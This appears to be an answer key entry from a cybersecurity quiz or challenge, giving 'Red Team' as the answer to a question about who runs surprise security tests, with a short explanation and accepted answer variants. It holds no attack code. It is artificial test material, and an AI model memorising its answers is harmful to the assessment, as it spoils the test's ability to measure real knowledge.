S1q39

The CEO of the company sat everyone down during the all hands meeting and said it was all a test. What type of group would conduct these types of tests?

/// Red Team

A red team conducts adversarial security exercises that simulate real attackers to evaluate an organization's ability to prevent, detect, and respond to attacks. In this scenario, the CEO revealing that "it was all a test" is describing a classic red team exercise.

Depending on the platform, acceptable variants may include:

✅ Red Team (most likely expected)
Red Team Exercise
Adversary Emulation Team (less likely)

Section 2: Cyber Coven

